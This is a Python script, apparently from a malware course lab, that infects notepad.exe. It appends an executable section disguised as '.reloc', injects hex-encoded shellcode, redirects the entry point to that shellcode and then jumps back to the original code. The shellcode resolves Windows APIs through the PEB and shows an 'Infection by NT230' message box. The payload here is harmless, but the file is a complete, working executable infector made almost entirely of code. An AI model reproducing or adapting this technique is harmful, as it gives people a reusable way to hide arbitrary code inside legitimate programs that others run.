import pefile
import binascii


def adjust_SectionSize(sz, align):
    if sz % align:
        sz = ((sz + align) // align) * align
    return sz


pe = pefile.PE('notepad.exe')
last_section = pe.sections[-1]

new_section = pefile.SectionStructure(pe.__IMAGE_SECTION_HEADER_format__)

# fill with zeros
new_section.__unpack__(bytearray(new_section.sizeof()))

# place section header after last section header (assume there is enough room)
new_section.set_file_offset(
    last_section.get_file_offset() + last_section.sizeof())

new_section.Name = b'.reloc'
new_section_size = 3000

new_section.SizeOfRawData = adjust_SectionSize(
    new_section_size, pe.OPTIONAL_HEADER.FileAlignment)
new_section.PointerToRawData = len(pe.__data__)

new_section.Misc = new_section.Misc_PhysicalAddress = new_section.Misc_VirtualSize = new_section_size
new_section.VirtualAddress = last_section.VirtualAddress + \
    adjust_SectionSize(last_section.Misc_VirtualSize,
                       pe.OPTIONAL_HEADER.SectionAlignment)

new_section.Characteristics = 0x40000000 | 0x20000000 | 0x20  # read | execute | code
# create new section data containing jump to OEP
# 4DC645E9
shellCode_part_one = binascii.unhexlify("558BEC81ECD4000000B86B0000006689459CB96500000066894D9EBA72000000668955A0B86E000000668945A2B96500000066894DA4BA6C000000668955A6B833000000668945A8B93200000066894DAABA2E000000668955ACB864000000668945AEB96C00000066894DB0BA6C000000668955B233C0668945B4C645D84CC645D96FC645DA61C645DB64C645DC4CC645DD69C645DE62C645DF72C645E061C645E172C645E279C645E341C645E400C645C847C645C965C645CA74C645CB50C645CC72C645CD6FC645CE63C645CF41C645D064C645D164C645D272C645D365C645D473C645D573C645D600C645F475C645F573C645F665C645F772C645F833C645F932C645FA2EC645FB64C645FC6CC645FD6CC645FE00C645E84DC645E965C645EA73C645EB73C645EC61C645ED67C645EE65C645EF42C645F06FC645F178C645F257C645F300B93100000066898D3CFFFFFFBA370000006689953EFFFFFFB83500000066898540FFFFFFB93200000066898D42FFFFFFBA3000000066899544FFFFFFB83500000066898546FFFFFFB93300000066898D48FFFFFFBA330000006689954AFFFFFFB82D0000006689854CFFFFFFB93100000066898D4EFFFFFFBA3700000066899550FFFFFFB83500000066898552FFFFFFB93200000066898D54FFFFFFBA3100000066899556FFFFFFB83200000066898558FFFFFFB93000000066898D5AFFFFFFBA320000006689955CFFFFFFB82D0000006689855EFFFFFFB93100000066898D60FFFFFFBA3800000066899562FFFFFFB83500000066898564FFFFFFB93200000066898D66FFFFFFBA3000000066899568FFFFFFB8370000006689856AFFFFFFB93800000066898D6CFFFFFFBA300000006689956EFFFFFF33C066898570FFFFFFB94900000066898D74FFFFFFBA6E00000066899576FFFFFFB86600000066898578FFFFFFB96500000066898D7AFFFFFFBA630000006689957CFFFFFFB8740000006689857EFFFFFFB96900000066894D80BA6F00000066895582B86E00000066894584B92000000066894D86BA6200000066895588B8790000006689458AB92000000066894D8CBA4E0000006689558EB85400000066894590B93200000066894D92BA3300000066895594B8300000006689459633C966894D988D559C52E81B02000083C4048945C4837DC400750AB801000000E9A70000008D45D8508B4DC451E89E00000083C4088945C0837DC000750AB802000000E9840000008D55C8528B45C450E87B00000083C4088945BC837DBC007507B803000000EB648B4DC0898D38FFFFFF8B55BC899530FFFFFF8D45F450FF9538FFFFFF898534FFFFFF8D4DE8518B9534FFFFFF52FF9530FFFFFF8945B8837DB8007507B804000000EB216A008D8574FFFFFF508D8D3CFFFFFF516A00FF55B833C0")

shellCode_part_two = binascii.unhexlify("000A0000008BE55DC3558BEC83EC3C8B45088945EC8B4DEC0FB71181FA4D5A0000740733C0E9350100008B45EC8B4D0803483C894DE4BA080000006BC2008B4DE48D5401788955E88B45E8833800750733C0E9080100008B4DE88B118955E08B45E00345088945F48B4DF48B51188955DC8B45F48B481C894DD08B55F48B42208945D88B4DF48B51248955D4C745F800000000EB098B45F883C0018945F88B4DF83B4DDC0F83B30000008B55080355D88B45F88D0C82894DC88B55080355D48B45F88D0C42894DCC8B55080355D08B45CC0FB7088D148A8955C48B45C88B4D080308894DF0C745FC00000000C745FC00000000EB098B55FC83C2018955FC8B450C0345FC0FBE0885C974278B55F00355FC0FBE0285C0741A8B4D0C034DFC0FBE118B45F00345FC0FBE083BD17402EB02EBC38B550C0355FC0FBE0285C075198B4DF0034DFC0FBE1185D2750C8B45C48B4D0803088BC1EB07E938FFFFFF33C08BE55DC3558BEC83EC34C745E40000000064A1300000008945E48B4DE48B510C8955D88B45D88B480C8B5010894DCC8955D08B45CC8945D48B4DD4894DE8837DE8000F845A0100008B55E8837A18000F844D0100008B45E8837830007502EBDE8B4DE88B51308955ECC745F000000000C745F000000000EB098B45F083C0018945F08B4DF08B55080FB7044A85C00F84DD0000008B4DF08B55EC0FB7044A85C00F84CB0000008B4DF08B55080FB7044A83F85A7F378B4DF08B55080FB7044A83F8417C288B4DF08B55080FB7044A83C0208945E08B4DF08B5508668B45E06689044A668B4DE066894DFEEB0E8B55F08B4508668B0C5066894DFE668B55FE668955F88B45F08B4DEC0FB7144183FA5A7F378B45F08B4DEC0FB7144183FA417C288B45F08B4DEC0FB7144183C2208955DC8B45F08B4DEC668B55DC66891441668B45DC668945FCEB0E8B4DF08B55EC668B044A668945FC668B4DFC66894DF40FB755F80FB745F43BD07402EB05E908FFFFFF8B4DF08B55080FB7044A85C075168B4DF08B55EC0FB7044A85C075088B4DE88B4118EB0F8B55E88B028945E8E99CFEFFFF33C08BE55DC3")

shellCode_jmp_oldEntryPoint = bytearray(4)
shellCode_jmp_oldEntryPoint[0] = 0xe9
shellCode_jmp_oldEntryPoint[1:4] = (pe.OPTIONAL_HEADER.AddressOfEntryPoint -
                                    (new_section.VirtualAddress + 5+int(len(shellCode_part_one)))).to_bytes(4,
                                                                                                            byteorder='little', signed=True)

shellCode_null = bytearray(
    new_section.SizeOfRawData - len(shellCode_part_one) - len(shellCode_part_two) - 5)


# change address of entry point to beginning of new section
pe.OPTIONAL_HEADER.AddressOfEntryPoint = new_section.VirtualAddress

# increase size of image
pe.OPTIONAL_HEADER.SizeOfImage += adjust_SectionSize(
    new_section_size, pe.OPTIONAL_HEADER.SectionAlignment)

# increase number of sections
pe.FILE_HEADER.NumberOfSections += 1

# append new section to structures
pe.sections.append(new_section)
pe.__structures__.append(new_section)

# add new section data to file
pe.__data__ = bytearray(pe.__data__) +\
    shellCode_part_one+shellCode_jmp_oldEntryPoint + \
    shellCode_part_two+shellCode_null
pe.write('notepad2.exe')
